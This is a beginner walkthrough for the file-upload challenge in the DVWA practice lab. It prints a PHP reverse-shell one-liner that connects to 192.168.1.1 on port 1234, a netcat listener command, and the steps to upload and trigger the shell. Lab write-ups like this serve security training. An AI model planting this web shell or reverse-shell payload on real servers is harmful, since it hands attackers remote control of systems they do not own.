📤 File Upload – Low Security Level

### 🛠️ Objective:
Upload a PHP web shell to gain remote code execution.

---

### 🧭 Walkthrough

1. Create a PHP reverse shell file with the following content:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/1234 0>&1'"); ?>
````

> 📌 Replace `192.168.1.1` with your machine’s IP address.

2. Save the file as:

```
shell.php
```

3. Upload the file using the DVWA form.

✅ If successful, DVWA will show you the **file path** like:

```
hackable/uploads/shell.php
```

4. In your terminal, start a Netcat listener:

```bash
nc -lnvp 1234
```

5. Open a new browser tab and access the uploaded PHP file:

```
http://127.0.0.1/DVWA/hackable/uploads/shell.php
```

🎯 This will trigger the reverse shell.

---

### 🧩 Summary

* ✅ No extension or MIME type check
* ✅ PHP is executable on upload
* ❌ No sanitization or validation

## ✅ Status

* ✅ Fully exploitable
* 🟢 Beginner-friendly
